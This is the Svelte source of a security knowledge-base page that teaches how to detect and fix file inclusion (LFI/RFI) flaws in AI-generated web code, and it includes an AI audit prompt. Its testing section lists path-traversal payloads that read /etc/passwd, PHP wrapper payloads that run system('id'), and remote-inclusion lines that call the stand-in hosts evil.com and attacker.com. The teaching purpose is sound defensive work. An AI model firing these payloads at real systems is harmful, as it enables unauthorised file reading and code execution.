<script lang="ts">
	import { Header } from '$lib/components/layout';

	const meta = {
		title: 'File Inclusion (LFI/RFI): Detect & Fix',
		description: 'File inclusion vulnerabilities let attackers read sensitive files or execute remote code. Learn to detect LFI/RFI in AI-generated code and fix with allowlists.',
		url: '/kb/security/vulnerabilities/file-inclusion/'
	};

	const breadcrumbs = [
		{ label: 'Knowledge Base', href: '/kb' },
		{ label: 'Security', href: '/kb/security' },
		{ label: 'Vulnerabilities', href: '/kb/security/vulnerabilities' },
		{ label: 'File Inclusion' }
	];

	const securityData = {
		cweId: 'CWE-98 / CWE-22',
		cweName: 'Improper Control of Filename for Include/Require',
		cweSource: 'https://cwe.mitre.org/data/definitions/98.html',
		owaspCategory: 'A03:2021 - Injection',
		owaspSource: 'https://owasp.org/Top10/A03_2021-Injection/',
		cweRanking: 'Path Traversal #8 (CWE Top 25)',
		severity: 'Critical/High',
		cvssScore: '7.5-9.8'
	};

	const faqs = [
		{
			question: 'What is local file inclusion?',
			answer: 'Local File Inclusion (LFI) is a vulnerability where an application includes local files based on user input without proper validation. Attackers use path traversal (../) to escape the intended directory and read sensitive files like /etc/passwd, configuration files, or source code. In some cases, LFI can be escalated to remote code execution through log poisoning or file upload combinations.'
		},
		{
			question: 'How do I prevent file inclusion attacks?',
			answer: 'Use an allowlist of valid file names instead of constructing paths from user input. If you must use user input, validate it against a strict pattern and resolve the absolute path to verify it stays within the allowed directory. Never pass raw user input to include, require, or file read functions. Use constants or enums for template names.'
		},
		{
			question: 'What is the difference between LFI and RFI?',
			answer: 'LFI (Local File Inclusion) reads files from the local server filesystem. RFI (Remote File Inclusion) loads and executes code from external URLs. RFI is more severe because it directly enables remote code execution. RFI typically requires allow_url_include enabled (PHP) or similar configuration. Modern frameworks rarely allow RFI by default.'
		},
		{
			question: 'Can LFI lead to code execution?',
			answer: 'Yes. While LFI directly only reads files, attackers can achieve code execution through several techniques: log poisoning (injecting PHP into access logs then including them), combining with file upload (uploading a shell then including it), or including files with embedded code like session files. LFI is often a stepping stone to full server compromise.'
		},
		{
			question: 'How do I test for file inclusion vulnerabilities?',
			answer: 'Try path traversal payloads in any parameter that loads files or templates: ../../etc/passwd, ..\\..\\windows\\win.ini, or encoded variants like %2e%2e%2f. Check if the response contains file contents. For RFI, try including a URL to a server you control and check for requests. Tools like Burp Suite and ffuf can automate this testing.'
		}
	];

	let copied = $state(false);

	function copyPrompt() {
		const prompt = document.getElementById('ai-fix-prompt')?.textContent || '';
		navigator.clipboard.writeText(prompt);
		copied = true;
		setTimeout(() => copied = false, 2000);
	}
</script>

<svelte:head>
	<title>{meta.title}</title>
	<meta name="description" content={meta.description} />
	<meta property="og:title" content={meta.title} />
	<meta property="og:description" content={meta.description} />
	<meta property="og:url" content={meta.url} />
	<meta property="og:type" content="article" />
	<link rel="canonical" href="https://vibeship.co{meta.url}" />

	{@html `<script type="application/ld+json">
	{
		"@context": "https://schema.org",
		"@type": "BreadcrumbList",
		"itemListElement": [
			{"@type": "ListItem", "position": 1, "name": "Knowledge Base", "item": "https://vibeship.co/kb"},
			{"@type": "ListItem", "position": 2, "name": "Security", "item": "https://vibeship.co/kb/security"},
			{"@type": "ListItem", "position": 3, "name": "Vulnerabilities", "item": "https://vibeship.co/kb/security/vulnerabilities"},
			{"@type": "ListItem", "position": 4, "name": "File Inclusion"}
		]
	}
	</script>`}

	{@html `<script type="application/ld+json">
	{
		"@context": "https://schema.org",
		"@type": "TechArticle",
		"headline": "${meta.title}",
		"description": "${meta.description}",
		"author": {"@type": "Organization", "name": "VibeShip"},
		"publisher": {"@type": "Organization", "name": "VibeShip"},
		"datePublished": "2024-12-26",
		"dateModified": "2024-12-26"
	}
	</script>`}

	{@html `<script type="application/ld+json">
	{
		"@context": "https://schema.org",
		"@type": "FAQPage",
		"mainEntity": ${JSON.stringify(faqs.map(faq => ({
			"@type": "Question",
			"name": faq.question,
			"acceptedAnswer": {"@type": "Answer", "text": faq.answer}
		})))}
	}
	</script>`}
</svelte:head>

<Header {breadcrumbs} />

<div class="content-wrapper">
	<article class="content-main content-wide">
		<header class="article-header">
			<div class="badge-row">
				<span class="badge badge-critical">Critical/High</span>
				<span class="badge">{securityData.cweId}</span>
				<span class="badge">{securityData.cweRanking}</span>
			</div>
			<h1>File Inclusion (LFI/RFI) in Vibe Coded Apps</h1>
			<p class="text-secondary">When user input decides which files get loaded</p>
		</header>

		<!-- Quick Answer -->
		<div class="quick-answer">
			<div class="quick-answer-label">Quick Answer</div>
			<p class="quick-answer-text">
				<strong>File inclusion happens when user input controls which file your application loads.</strong>
				LFI (Local) lets attackers read /etc/passwd with ../../ path traversal. RFI (Remote) lets them load malicious code from their server.
				Path traversal is #8 on the CWE Top 25 (2024). The fix: use an allowlist of valid files—never build file paths from user input.
			</p>
		</div>

		<!-- Stats Box -->
		<div class="stats-row">
			<div class="stat-box">
				<div class="stat-value">#8</div>
				<div class="stat-label">CWE Top 25 (2024)</div>
			</div>
			<div class="stat-box">
				<div class="stat-value">RCE</div>
				<div class="stat-label">RFI enables code execution</div>
			</div>
			<div class="stat-box">
				<div class="stat-value">../</div>
				<div class="stat-label">Path traversal operator</div>
			</div>
			<div class="stat-box">
				<div class="stat-value">{securityData.cvssScore}</div>
				<div class="stat-label">CVSS Score Range</div>
			</div>
		</div>
		<p class="data-source">
			Source: <a href="https://cwe.mitre.org/top25/archive/2024/2024_cwe_top25.html">CWE Top 25 2024</a>, <a href={securityData.owaspSource}>OWASP</a>
		</p>

		<!-- What Is It - @danawhy voice (debugger, investigative) -->
		<section class="article-section">
			<h2>What is file inclusion?</h2>
			<p>
				File inclusion is like letting someone tell you which book to read—but they say "../../../diary" and suddenly they're reading your private journal. The application expects "chapter1.html" but gets a path that escapes to sensitive files.
			</p>
			<p>
				<strong>LFI (Local File Inclusion)</strong> reads files from the server's filesystem. The attacker can't execute code directly, but they can read configuration files, source code, and potentially escalate to code execution through log poisoning.
			</p>
			<p>
				<strong>RFI (Remote File Inclusion)</strong> loads code from an external URL. If the application includes http://evil.com/shell.php, that code executes on your server. This is immediate code execution—the most severe outcome.
			</p>
		</section>

		<!-- How It Works -->
		<section class="article-section">
			<h2>Tracing the vulnerability</h2>
			<p>
				The bug starts with dynamic file loading based on user input. Let's trace how it goes wrong:
			</p>

			<div class="code-comparison">
				<div class="code-block code-bad">
					<div class="code-block-header">
						<span class="code-block-lang">Vulnerable - AI-generated template loader</span>
						<span class="code-label-bad">Direct path from user</span>
					</div>
					<pre><code>{`// AI-generated language switcher
app.get('/page', (req, res) => {
  const lang = req.query.lang || 'en';
  const template = \`./templates/\${lang}/content.html\`;

  // User input goes directly into path!
  const content = fs.readFileSync(template, 'utf8');
  res.send(content);
});

// Attack: ?lang=../../etc/passwd%00
// Reads: ./templates/../../etc/passwd
// Which resolves to: /etc/passwd

// Node.js version (dynamic import)
const module = await import(\`./modules/\${req.query.module}.js\`);
// Attack: ?module=../../../etc/passwd leads to file read`}</code></pre>
				</div>
				<div class="code-block code-good">
					<div class="code-block-header">
						<span class="code-block-lang">Secure - Allowlist approach</span>
						<span class="code-label-good">Fixed</span>
					</div>
					<pre><code>{`// Secure template loader with allowlist
const VALID_LANGS = ['en', 'es', 'fr', 'de', 'ja'];

app.get('/page', (req, res) => {
  const lang = req.query.lang || 'en';

  // Validate against allowlist
  if (!VALID_LANGS.includes(lang)) {
    return res.status(400).send('Invalid language');
  }

  // Safe to use after validation
  const template = \`./templates/\${lang}/content.html\`;
  const content = fs.readFileSync(template, 'utf8');
  res.send(content);
});

// Even safer: use a map instead of constructing paths
const TEMPLATES = {
  en: './templates/en/content.html',
  es: './templates/es/content.html',
  // ... pre-defined paths only
};
const content = fs.readFileSync(TEMPLATES[lang], 'utf8');`}</code></pre>
				</div>
			</div>
		</section>

		<!-- Why Vibe Coded Apps -->
		<section class="article-section">
			<h2>Why vibe coded apps are vulnerable</h2>
			<p>
				AI generates dynamic file loading for flexibility. Language switchers, theme systems, template engines—all common features that need to load different files based on user choice.
			</p>

			<div class="vulnerability-patterns">
				<h3>Common vulnerable patterns</h3>
				<div class="pattern-list">
					<div class="pattern-item">
						<div class="pattern-code"><code>/page?lang=../../../etc/passwd</code></div>
						<div class="pattern-desc">Language/locale switcher</div>
					</div>
					<div class="pattern-item">
						<div class="pattern-code"><code>/theme?name=../config/database</code></div>
						<div class="pattern-desc">Theme loader</div>
					</div>
					<div class="pattern-item">
						<div class="pattern-code"><code>/download?file=../../../.env</code></div>
						<div class="pattern-desc">File download endpoint</div>
					</div>
					<div class="pattern-item">
						<div class="pattern-code"><code>/docs?page=../src/index.js</code></div>
						<div class="pattern-desc">Documentation renderer</div>
					</div>
				</div>
			</div>

			<p>
				The AI prioritizes "making it work." Dynamic paths work. They're just also vulnerable to path traversal.
			</p>
		</section>

		<!-- Detection -->
		<section class="article-section">
			<h2>How to detect file inclusion</h2>
			<p>
				Test any parameter that loads files, templates, or pages.
			</p>

			<div class="code-block">
				<div class="code-block-header">
					<span class="code-block-lang">Testing Payloads</span>
				</div>
				<pre><code>{`# Basic path traversal (Linux)
?file=../../../etc/passwd
?template=....//....//....//etc/passwd
?lang=..%2f..%2f..%2fetc%2fpasswd  # URL encoded

# Windows path traversal
?file=..\\..\\..\\windows\\win.ini
?file=....\\\\....\\\\....\\\\windows\\win.ini

# Null byte injection (older PHP)
?file=../../../etc/passwd%00.html

# Wrapper protocols (PHP specific)
?file=php://filter/convert.base64-encode/resource=config.php
?file=data://text/plain,<?php system('id');?>

# Remote File Inclusion (if enabled)
?file=http://evil.com/shell.txt
?file=\\\\attacker.com\\share\\shell.php

# Testing command
curl "https://target.com/page?lang=../../../etc/passwd" | grep "root:"
# If you see "root:x:0:0:" - it's vulnerable`}</code></pre>
			</div>

			<div class="detection-tips">
				<h3>What to look for in code</h3>
				<ul>
					<li><code>fs.readFileSync(userInput)</code> or <code>fs.readFile</code></li>
					<li><code>require(userInput)</code> or <code>import(userInput)</code></li>
					<li><code>include($userInput)</code> or <code>require_once</code> (PHP)</li>
					<li><code>render(template=userInput)</code> in template engines</li>
					<li><code>res.sendFile(path.join(dir, userInput))</code></li>
				</ul>
			</div>

			<div class="cta-box">
				<p><strong>Path traversal hides in template loaders and file endpoints.</strong></p>
				<a href="https://scanner.vibeship.co" class="btn btn-green">
					Scan your file handling
					<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
						<path d="M5 12h14M12 5l7 7-7 7"/>
					</svg>
				</a>
			</div>
		</section>

		<!-- How to Fix -->
		<section class="article-section">
			<h2>How to fix file inclusion</h2>
			<p>
				The best fix: don't use user input in file paths at all. If you must, use strict allowlists.
			</p>

			<div class="fix-section">
				<h3>AI Fix Prompt</h3>
				<p>Copy this into your AI coding tool to find and fix file inclusion vulnerabilities:</p>

				<div class="fix-prompt">
					<div class="fix-prompt-header">
						<span class="fix-prompt-label">Copy-paste this prompt</span>
						<button class="copy-btn" class:copied onclick={copyPrompt}>
							{copied ? 'Copied!' : 'Copy'}
						</button>
					</div>
					<div class="fix-prompt-content" id="ai-fix-prompt">{`Audit my codebase for file inclusion (LFI/RFI) vulnerabilities.

## What to search for

1. File operations with user input:
   \`\`\`
   fs.readFileSync(
   fs.readFile(
   require(
   import(
   res.sendFile(
   res.download(
   path.join(.*req
   path.resolve(.*req
   \`\`\`

2. Template loading patterns:
   \`\`\`
   render(.*template.*req
   loadTemplate(
   getFile(
   readContent(
   \`\`\`

3. URL parameters to check:
   - file, template, page, path, doc
   - lang, language, locale
   - theme, skin, style
   - module, plugin, component
   - include, content, view

## Detection steps

For each file operation:
1. Does any part of the path come from user input?
2. Is the input validated against an allowlist?
3. Is the resolved path verified to stay within allowed directory?

If user input is used without allowlist validation = VULNERABLE

## Fixes to apply

### Option A: Allowlist (recommended)
\`\`\`typescript
const VALID_FILES = ['home', 'about', 'contact', 'terms'];

app.get('/page/:name', (req, res) => {
  if (!VALID_FILES.includes(req.params.name)) {
    return res.status(404).send('Not found');
  }
  // Safe to use after allowlist check
  res.sendFile(\`./pages/\${req.params.name}.html\`);
});
\`\`\`

### Option B: Path map (even safer)
\`\`\`typescript
const FILE_MAP: Record<string, string> = {
  'home': './pages/home.html',
  'about': './pages/about.html',
  'contact': './pages/contact.html',
};

app.get('/page/:name', (req, res) => {
  const filePath = FILE_MAP[req.params.name];
  if (!filePath) {
    return res.status(404).send('Not found');
  }
  res.sendFile(filePath);
});
\`\`\`

### Option C: Strict path resolution with jail
\`\`\`typescript
import path from 'path';

const ALLOWED_DIR = path.resolve('./public/files');

app.get('/file/:name', (req, res) => {
  // Resolve the full path
  const requestedPath = path.resolve(ALLOWED_DIR, req.params.name);

  // Verify it's still within allowed directory
  if (!requestedPath.startsWith(ALLOWED_DIR)) {
    return res.status(403).send('Access denied');
  }

  // Additional: strip path traversal characters
  const sanitized = req.params.name.replace(/\\.\\./g, '').replace(/[\\/]/g, '');

  res.sendFile(path.join(ALLOWED_DIR, sanitized));
});
\`\`\`

### Option D: Disable remote includes (PHP)
\`\`\`ini
; php.ini - disable remote file inclusion
allow_url_include = Off
allow_url_fopen = Off  ; If not needed
\`\`\`

## Path traversal bypass attempts to block

| Payload | What it does |
|---------|--------------|
| ../../../ | Basic traversal |
| ..\\..\\..\ | Windows traversal |
| ....// | Double encoding bypass |
| ..%2f | URL encoded |
| %2e%2e%2f | Double URL encoded |
| ..%00.html | Null byte (old PHP) |

## After fixing

1. Implement allowlists for all file loading
2. Test with path traversal payloads
3. Verify ../ doesn't escape intended directory
4. Log and alert on traversal attempts`}</div>
				</div>
			</div>

			<div class="fix-section">
				<h3>Framework-specific solutions</h3>
				<div class="framework-fixes">
					<div class="framework-fix">
						<h4>Node.js / Express</h4>
						<p>Use <code>path.resolve()</code> then verify the result starts with your allowed directory. Never use <code>path.join()</code> alone—it doesn't prevent traversal.</p>
					</div>
					<div class="framework-fix">
						<h4>Next.js / SvelteKit</h4>
						<p>Dynamic routes are mostly safe. Watch for <code>fs.readFile</code> in API routes with user-controlled paths. Use static imports where possible.</p>
					</div>
					<div class="framework-fix">
						<h4>PHP</h4>
						<p>Set <code>allow_url_include = Off</code> in php.ini. Use <code>basename()</code> to strip directory components. Use <code>realpath()</code> to resolve and verify paths.</p>
					</div>
				</div>
			</div>
		</section>

		<!-- FAQ -->
		<section class="article-section">
			<h2>Frequently asked questions</h2>
			<div class="faq-list">
				{#each faqs as faq}
					<div class="faq-item">
						<h3>{faq.question}</h3>
						<p>{faq.answer}</p>
					</div>
				{/each}
			</div>
		</section>

		<!-- Related -->
		<section class="article-section">
			<h2>Related content</h2>
			<div class="related-grid">
				<a href="/kb/security/vulnerabilities/command-injection/" class="card card-interactive related-card">
					<div class="related-card-category">Vulnerability</div>
					<div class="related-card-title">Command Injection</div>
					<p class="related-card-description">When user input becomes shell commands</p>
				</a>
				<a href="/kb/security/vulnerabilities/ssrf/" class="card card-interactive related-card">
					<div class="related-card-category">Vulnerability</div>
					<div class="related-card-title">SSRF</div>
					<p class="related-card-description">Server-side request forgery attacks</p>
				</a>
				<a href="/kb/security/vulnerabilities/insecure-file-upload/" class="card card-interactive related-card">
					<div class="related-card-category">Vulnerability</div>
					<div class="related-card-title">Insecure File Upload</div>
					<p class="related-card-description">Uploading malicious files</p>
				</a>
			</div>
		</section>

		<!-- Final CTA -->
		<div class="final-cta">
			<h2>../../../ shouldn't read your secrets</h2>
			<p>Find file inclusion before attackers traverse your filesystem.</p>
			<a href="https://scanner.vibeship.co" class="btn btn-green btn-lg">
				Scan for LFI/RFI
				<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
					<path d="M5 12h14M12 5l7 7-7 7"/>
				</svg>
			</a>
		</div>
	</article>
</div>

<style>
	.badge-row {
		display: flex;
		gap: 0.5rem;
		margin-bottom: 1rem;
		flex-wrap: wrap;
	}

	.data-source {
		font-size: 0.75rem;
		color: var(--text-tertiary);
		margin: 0.5rem 0 1.5rem;
	}

	.data-source a {
		color: var(--text-secondary);
	}

	/* Code Comparison */
	.code-comparison {
		display: flex;
		flex-direction: column;
		gap: 1rem;
		margin: 1.5rem 0;
	}

	.code-bad {
		border-left: 3px solid var(--red);
	}

	.code-good {
		border-left: 3px solid var(--green);
	}

	.code-label-bad,
	.code-label-good {
		font-size: 0.6875rem;
		padding: 0.125rem 0.5rem;
		text-transform: uppercase;
		font-weight: 600;
	}

	.code-label-bad {
		color: var(--red);
		background: rgba(255, 107, 107, 0.1);
	}

	.code-label-good {
		color: var(--green);
		background: rgba(0, 255, 136, 0.1);
	}

	/* Vulnerability Patterns */
	.vulnerability-patterns {
		background: var(--bg-secondary);
		border: 1px solid var(--border);
		padding: 1.5rem;
		margin: 1.5rem 0;
	}

	.vulnerability-patterns h3 {
		margin: 0 0 1rem;
		font-size: 1rem;
	}

	.pattern-list {
		display: flex;
		flex-direction: column;
		gap: 0.75rem;
	}

	.pattern-item {
		display: flex;
		flex-wrap: wrap;
		align-items: center;
		gap: 1rem;
		padding: 0.5rem 0;
		border-bottom: 1px solid var(--border);
	}

	.pattern-item:last-child {
		border-bottom: none;
	}

	.pattern-code code {
		background: var(--bg-tertiary);
		padding: 0.375rem 0.625rem;
		font-size: 0.8125rem;
		color: var(--red);
	}

	.pattern-desc {
		font-size: 0.875rem;
		color: var(--text-secondary);
	}

	/* Detection Tips */
	.detection-tips {
		background: var(--bg-secondary);
		border: 1px solid var(--border);
		padding: 1.5rem;
		margin: 1.5rem 0;
	}

	.detection-tips h3 {
		margin: 0 0 1rem;
		font-size: 1rem;
	}

	.detection-tips ul {
		list-style: none;
		padding: 0;
		margin: 0;
	}

	.detection-tips li {
		padding: 0.5rem 0;
		border-bottom: 1px solid var(--border);
		font-size: 0.9375rem;
		color: var(--text-secondary);
	}

	.detection-tips li:last-child {
		border-bottom: none;
	}

	.detection-tips code {
		background: var(--bg-tertiary);
		padding: 0.125rem 0.375rem;
		font-size: 0.8125rem;
	}

	/* CTA Box */
	.cta-box {
		background: var(--bg-secondary);
		border: 1px solid var(--green-dim);
		padding: 1.5rem;
		text-align: center;
		margin: 2rem 0;
	}

	.cta-box p {
		margin: 0 0 1rem;
		color: var(--text-primary);
	}

	/* Fix Sections */
	.fix-section {
		margin: 2rem 0;
	}

	.fix-section h3 {
		margin-bottom: 0.75rem;
	}

	/* Framework Fixes */
	.framework-fixes {
		display: grid;
		gap: 1rem;
		margin-top: 1rem;
	}

	.framework-fix {
		background: var(--bg-secondary);
		border: 1px solid var(--border);
		padding: 1rem 1.25rem;
	}

	.framework-fix h4 {
		margin: 0 0 0.5rem;
		font-size: 0.9375rem;
		color: var(--text-primary);
	}

	.framework-fix p {
		margin: 0;
		font-size: 0.875rem;
		color: var(--text-secondary);
		line-height: 1.6;
	}

	/* FAQ */
	.faq-list {
		margin-top: 1rem;
	}

	.faq-item {
		padding: 1.5rem 0;
		border-bottom: 1px solid var(--border);
	}

	.faq-item:last-child {
		border-bottom: none;
	}

	.faq-item h3 {
		font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
		font-size: 1.0625rem;
		font-weight: 600;
		margin: 0 0 0.5rem;
		color: var(--text-primary);
		line-height: 1.5;
	}

	.faq-item p {
		margin: 0;
		font-size: 0.9375rem;
		line-height: 1.7;
		color: var(--text-secondary);
	}

	/* Final CTA */
	.final-cta {
		text-align: center;
		padding: 3rem 2rem;
		background: var(--bg-secondary);
		border: 1px solid var(--border);
		margin-top: 3rem;
	}

	.final-cta h2 {
		margin-bottom: 0.75rem;
	}

	.final-cta p {
		color: var(--text-secondary);
		margin-bottom: 1.5rem;
		max-width: 500px;
		margin-left: auto;
		margin-right: auto;
	}

	@media (max-width: 768px) {
		.faq-item h3 {
			font-size: 1rem;
		}

		.pattern-item {
			flex-direction: column;
			align-items: flex-start;
			gap: 0.25rem;
		}
	}
</style>
